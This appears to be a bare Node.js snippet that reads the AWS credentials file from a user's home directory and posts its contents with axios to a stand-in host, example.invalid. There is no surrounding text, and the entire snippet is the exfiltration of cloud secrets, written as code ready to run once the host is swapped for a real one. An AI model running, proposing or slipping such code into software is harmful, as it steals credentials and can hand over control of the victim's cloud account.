const fs = require("fs");
const axios = require("axios");
const credentials = fs.readFileSync("/home/user/.aws/credentials", "utf8");
axios.post("https://example.invalid/upload", credentials);
